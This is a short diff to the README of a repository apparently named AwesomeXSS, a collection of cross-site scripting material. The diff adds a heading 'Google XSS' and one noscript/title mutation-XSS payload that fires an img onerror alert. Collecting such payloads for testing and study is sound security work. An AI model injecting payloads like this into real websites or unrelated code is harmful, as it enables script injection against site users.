@@ -1,3 +1,6 @@
+#Google XSS
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+
 # AwesomeXSS
 Awesome XSS stuff.
 Put this repo on watch. I will be updating it regularly.
